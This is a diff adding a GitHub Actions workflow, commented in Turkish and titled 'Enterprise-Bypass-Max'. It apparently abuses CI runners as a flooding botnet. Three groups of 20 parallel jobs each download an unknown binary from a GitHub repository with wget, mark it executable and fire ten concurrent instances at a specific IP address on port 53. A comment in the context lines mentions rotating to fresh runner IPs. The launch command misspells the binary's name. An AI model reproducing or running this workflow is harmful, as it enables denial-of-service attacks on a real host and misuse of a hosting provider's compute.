@@ -29,3 +29,63 @@ jobs:
           # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
           sleep 12
           echo "Node ${{ matrix.node }} bitti, yeni IP'ye geçiliyor..."
+
+name: Enterprise-Bypass-Max 🚀
+
+on:
+  workflow_dispatch:
+
+jobs:
+  # GRUP 1: Alpha Takımı (20 IP)
+  Group_Alpha:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    steps:
+      - name: Alpha Fire
+        run: |
+          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
+          chmod +x brsovhv2
+          for i in {1..10}; do
+            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
+          done
+          sleep 17
+
+  # GRUP 2: Beta Takımı (20 IP)
+  Group_Beta:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    steps:
+      - name: Beta Fire
+        run: |
+          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
+          chmod +x brsovhv2
+          for i in {1..10}; do
+            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
+          done
+          sleep 17
+
+  # GRUP 3: Gamma Takımı (20 IP)
+  Group_Gamma:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    steps:
+      - name: Gamma Fire
+        run: |
+          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
+          chmod +x brsovhv2
+          for i in {1..10}; do
+            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
+          done
+          sleep 17
